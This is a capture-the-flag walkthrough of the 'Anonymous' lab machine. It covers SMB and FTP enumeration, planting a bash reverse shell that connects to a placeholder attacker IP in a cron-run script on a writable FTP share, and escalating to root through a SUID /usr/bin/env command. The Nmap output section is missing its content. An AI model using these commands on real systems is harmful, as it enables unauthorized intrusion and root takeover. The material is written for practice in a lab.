Anonymous is an easy machine on HackTheBox that involves exploiting writable FTP services and SUID misconfigurations to gain root access. This walkthrough will guide you through the process of compromising the Anonymous machine, from initial reconnaissance to gaining root access.

## Reconnaissance

The initial reconnaissance was performed using **Nmap**, revealing the following open services:

```nmap

Nmap scan report for 10.10.187.181

According to  **Nmap** the target machine is running **FTP**, **SSH**, and **SMB** services.

### SMB Enumeration

Using `smbclient`, I enumerated the available shares:

```bash
smbclient -L //$ip/
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```

The share `pics` was accessible and contained two image files:

```bash
smbclient //$ip/pics
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020

  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13306816 blocks available

```

After downloading and analyzing the files for hidden data (steganography), no useful information was found. This turned out to be a rabbit hole.

### FTP Enumeration

The FTP server allows anonymous login and is writable. Listing its contents revealed a `scripts` folder containing several files:

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          946 Dec 02 14:44 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.

```

The file `clean.sh` appears to be executed periodically via a cron job. The script logic is as follows:

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```

The script checks for files in the `/tmp` directory and removes them, logging the activity. Since the FTP server is writable, I modified this script to include a reverse shell.

## Gaining Access

The FTP server was mounted using `curlftpfs`

```
curlftpfs anonymous@$ip mount/
```

Using **vim**, I added a bash reverse shell payload to `clean.sh`:

```
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```

After waiting for the cron job to execute, I received a reverse shell as the user `namelessone`.

## Privilege Escalation

### From `namelessone` to `root`

During enumeration, I discovered that the SUID bit was set on `/usr/bin/env`. Exploiting this allowed privilege escalation to `root`:

```
/usr/bin/env /bin/sh -p
```
Executing the above command granted root access:

```bash
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
whoami
root
```

## Conclusion

The `Anonymous` machine was compromised through a combination of enumeration, abuse of writable services, and exploitation of SUID misconfigurations.
